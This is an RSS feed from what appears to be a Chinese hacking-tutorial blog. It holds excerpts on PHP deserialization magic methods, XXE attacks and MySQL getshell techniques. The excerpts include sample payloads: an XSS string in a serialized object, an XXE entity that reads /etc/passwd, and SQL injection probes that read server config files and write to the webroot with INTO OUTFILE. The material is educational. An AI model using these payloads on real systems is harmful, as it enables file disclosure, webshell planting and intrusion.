<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Posts on H4ck3r Station</title>
    <link>http://localhost:1313/posts/</link>
    <description>Recent content in Posts on H4ck3r Station</description>
    <generator>Hugo -- 0.155.1</generator>
    <language>zh-cn</language>
    <lastBuildDate>Sat, 07 Feb 2026 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>PHP反序列化</title>
      <link>http://localhost:1313/posts/php_serialize/</link>
      <pubDate>Sat, 07 Feb 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/php_serialize/</guid>
      <description>&lt;p&gt;距离第一次学习php反序列已经很长时间了，初次学习时就学的迷迷糊糊，有很多理解不到位的地方，正好最近有时间打算回过头重新开始学习一遍，理解不到位之处请各位大佬多多指正。&lt;/p&gt;
&lt;h3 id=&#34;为什么需要序列化和反序列化&#34;&gt;为什么需要序列化和反序列化？&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络传输只能处理位流(Bytes)&lt;/strong&gt; , 当你在java,php,python中定义一个复杂的用户对象，但是路由器并不认识，只能通过序列化成字符串的方式以字节流的方式传输，传输流程大致如下：&lt;/p&gt;
&lt;p&gt;服务器对象&amp;ndash;&amp;gt; 序列化&amp;ndash;&amp;gt; 字节流&amp;ndash;&amp;gt; 网络传输&amp;ndash;&amp;gt; 反序列化&amp;ndash;&amp;gt; 客户端&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;内存(RAM)易失&lt;/strong&gt;，程序运行在内存中，一旦断电，关闭数据就会消失&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;php中的序列化反序列化函数&#34;&gt;php中的序列化反序列化函数&lt;/h3&gt;
&lt;p&gt;序列化：&lt;code&gt;serialize()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;反序列化：&lt;code&gt;unserialize()&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;
&lt;p&gt;前提:  服务端(不论是当前代码还是所包含的代码中)必须要有对象(序列化形式)所对应的类, 否则无法反序列化&lt;/p&gt;
&lt;p&gt;例如: &lt;code&gt;payload:O:1:&amp;quot;**S**&amp;quot;:1:{s:4:&amp;quot;test&amp;quot;;s:29:&amp;quot;&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&amp;quot;;} &lt;/code&gt;这时候如果服务端没有一个叫做S的类, 就会反序列化失败&lt;/p&gt;
&lt;p&gt;所以说, 想要发起反序列化攻击, 必要条件之一: 必须知道服务端有哪些类&lt;/p&gt;
&lt;h3 id=&#34;魔术方法&#34;&gt;魔术方法&lt;/h3&gt;
&lt;p&gt;注:加黑重点关注&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;魔术方法&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__construct()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;构造方法&lt;/strong&gt;，当对象被实例化（&lt;code&gt;new&lt;/code&gt;）时自动调用。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__destruct()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;析构方法&lt;/strong&gt;，当对象被销毁时自动调用。反序列化攻击中最常见的入口。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__call()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;在对象上下文中调用一个&lt;strong&gt;不可访问或不存在的方法&lt;/strong&gt;时触发。常用的跳板。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__callStatic()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;在静态上下文中调用一个&lt;strong&gt;不可访问或不存在的方法&lt;/strong&gt;时触发。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__get()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;读取对象中&lt;strong&gt;不可访问（未定义或私有）的属性&lt;/strong&gt;时触发。常用的跳板。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__set()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;写入对象中&lt;strong&gt;不可访问（未定义或私有）的属性&lt;/strong&gt;时触发。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__isset()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;使用 &lt;code&gt;isset()&lt;/code&gt; 或 &lt;code&gt;empty()&lt;/code&gt; 检查对象中不可访问的属性时触发。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__unset()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;使用 &lt;code&gt;unset()&lt;/code&gt; 删除对象中不可访问的属性时触发。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__sleep()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当对象被 &lt;code&gt;serialize()&lt;/code&gt; 序列化前触发，通常用于返回需要被序列化的属性列表。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__wakeup()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当对象被 &lt;code&gt;unserialize()&lt;/code&gt; 反序列化时触发，常用于初始化资源。反序列化的“点火开关”。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__toString()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当对象被转换成&lt;strong&gt;字符串&lt;/strong&gt;（如 &lt;code&gt;echo&lt;/code&gt; 或拼接）时自动调用。核心跳板。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__invoke()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当尝试以&lt;strong&gt;函数方式调用对象&lt;/strong&gt;（如 &lt;code&gt;$obj()&lt;/code&gt;）时触发。常用的跳板。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__clone()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当对象使用 &lt;code&gt;clone&lt;/code&gt; 关键字被克隆时调用。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__serialize()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;PHP 7.4+ 引入。序列化前触发，优先级高于 &lt;code&gt;__sleep&lt;/code&gt;。返回一个包含对象数据的数组。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__unserialize()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;PHP 7.4+ 引入。反序列化后触发，优先级高于 &lt;code&gt;__wakeup&lt;/code&gt;。用于恢复对象状态。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__set_state()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当使用 &lt;code&gt;var_export()&lt;/code&gt; 导出类时触发。必须是静态方法，返回类实例。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__debugInfo()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当使用 &lt;code&gt;var_dump()&lt;/code&gt; 打印对象信息时触发，用于控制显示的属性。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;1、 &lt;code&gt;__construct()&lt;/code&gt; 和 &lt;code&gt;__destruct()&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>XML 漏洞详解</title>
      <link>http://localhost:1313/posts/xml/</link>
      <pubDate>Wed, 04 Feb 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/xml/</guid>
      <description>&lt;h1 id=&#34;xml漏洞&#34;&gt;XML漏洞&lt;/h1&gt;
&lt;h2 id=&#34;理论&#34;&gt;理论：&lt;/h2&gt;
&lt;p&gt;xml是一种用来传输和存储数据的格式，长得有些像HTML&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;user&amp;gt;
	&amp;lt;username&amp;gt;admin&amp;lt;/username&amp;gt;
	&amp;lt;role&amp;gt;manager&amp;lt;/role&amp;gt;
&amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要学习XML就要先学习DTD&lt;/p&gt;
&lt;p&gt;什么是DTD？&lt;/p&gt;
&lt;p&gt;DTD（文档类型定义）使用来定义xml文档的合法结构。重点在于DTD允许定义实体也就是&lt;strong&gt;Entity&lt;/strong&gt;，而他也就是漏洞的根源&lt;/p&gt;
&lt;p&gt;他有些像编程语言中的变量，举两个例子&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;内部实体   
&amp;lt;!DOCTYPE root [
	&amp;lt;!ENTITY name &amp;#34;h4xk0r&amp;#34;&amp;gt;
]&amp;gt;
&amp;lt;root&amp;gt;Hello &amp;amp;name;&amp;lt;/root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;外部实体----这是漏洞的核心，xml允许从外部通过url或文件路径加载数据
语法关键字 SYSTEM 或 PUBLIC

&amp;lt;!DOCTYPE root[
	&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;
]&amp;gt;
&amp;lt;root&amp;gt;&amp;amp;xxe;&amp;lt;root&amp;gt;

如果在实际过程中后端接收了你的XML，并且解析了&amp;amp;xxe这个变量，那么就可以通过构造SYSTEM后面的路径，让服务器读取文件，探测内网
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;实战向&#34;&gt;实战向：&lt;/h2&gt;
&lt;h3 id=&#34;怎么去寻找漏洞点&#34;&gt;怎么去寻找漏洞点：&lt;/h3&gt;
&lt;p&gt;显式的XML接口：&lt;/p&gt;
&lt;p&gt;如果请求头是 &lt;code&gt;Content-Type: application/xml&lt;/code&gt; 或 &lt;code&gt;text/xml&lt;/code&gt;，且数据包体是 XML，那么可以直接插入payload进行测试，但是感觉现在很少了&lt;/p&gt;
&lt;p&gt;隐式接口（content-Type欺骗）：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;假设一个api接口是这样的：
POST /api/login HTTP/1.1
Content-Type: application/json

{&amp;#34;user&amp;#34;: &amp;#34;admin&amp;#34;, &amp;#34;pass&amp;#34;: &amp;#34;123&amp;#34;}

很多框架为了兼容性，会根据Content-Type切换解析器，所以我们构造payload

POST /api/login HTTP/1.1
Content-Type: application/xml  &amp;lt;-- 修改这里

&amp;lt;?xml version=&amp;#34;1.0&amp;#34; ?&amp;gt;
&amp;lt;user&amp;gt;admin&amp;lt;/user&amp;gt;
&amp;lt;pass&amp;gt;123&amp;lt;/pass&amp;gt;

如果这时候服务器没有报错说明支持xml格式，那么就可以构造payload测试xxe漏洞了
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;文件上传（SVG与office）&amp;ndash;这个是比较容易被忽视的点&lt;/p&gt;
&lt;p&gt;svg： 是一种图片格式的矢量图。微信头像，网站logo上传处&lt;/p&gt;
&lt;p&gt;Execl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传，报表导入处&lt;/p&gt;</description>
    </item>
    <item>
      <title>MySQL getshell</title>
      <link>http://localhost:1313/posts/mysql-getshell/</link>
      <pubDate>Fri, 30 Jan 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/mysql-getshell/</guid>
      <description>&lt;h2 id=&#34;udf--os-shell&#34;&gt;UDF  (&amp;ndash;os-shell)&lt;/h2&gt;
&lt;h3 id=&#34;利用条件&#34;&gt;利用条件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;数据库为DBA,可以使用sqlmap的&lt;code&gt;--is-dba&lt;/code&gt;查看当前网站连接的数据库账户是否是管理员&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;没有具体值&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;查找:
1. --sql-shell 
1. 进入数据库后: SHOW VARS LIKE &amp;#39;secure_file_priv&amp;#39;;
2. 盲注:使用length()函数推测: ?id=1 AND (SELECT @@secure_file_priv) IS NULL 
	返回正常则null,无法写入
	页面异常则,则不是null
	判断是否为空:
	?id=1 AND length(@@secure_file_priv) = 0	页面正常则为空
3. 尝试写入文件: ?id=1 INTO OUTFILE &amp;#39;/var/www/html/test.txt&amp;#39; -- 根据报错信息判断
4.权限检查: ?id=1 AND (SELECT user_privileges FROM information_schema.user_privileges WHERE privilege_type=&amp;#39;FILE&amp;#39; AND grantee=CONCAT(&amp;#34;&amp;#39;&amp;#34;, (SELECT CURRENT_USER()), &amp;#34;&amp;#39;&amp;#34;)) IS NOT NULL	即使secure_file_priv为空,用户没有FILE权限,也无法写入
或者
AND (SELECT 1 FROM mysql.user LIMIT 1)，如果能访问 mysql 库，通常意味着是高权限。
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;知道网站的绝对路径&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;查找:
1. 注入报错信息
2. 利用内部函数和元数据:
Apache (Ubuntu):  UNION SELECT 1, load_file(&amp;#39;/etc/apache2/sites-enabled/000-default.conf&amp;#39;), 3
Nginx:               UNION SELECT 1, load_file(&amp;#39;/etc/nginx/nginx.conf&amp;#39;), 3
Windows (IIS):       C:\Windows\System32\inetsrv\config\applicationHost.config
3.常见的默认路径:
Linux (Apache)	/var/www/html/, /var/www/www.example.com/
Linux (Nginx)	/usr/share/nginx/html/, /var/www/html/
Windows (IIS)	C:\inetpub\wwwroot\
Windows (XAMPP)	C:\xampp\htdocs\
Windows (phpStudy)	D:\phpstudy_pro\WWW\, C:\phpStudy\WWW\
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h3&gt;
&lt;p&gt;方法一: &amp;ndash;os-shell&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
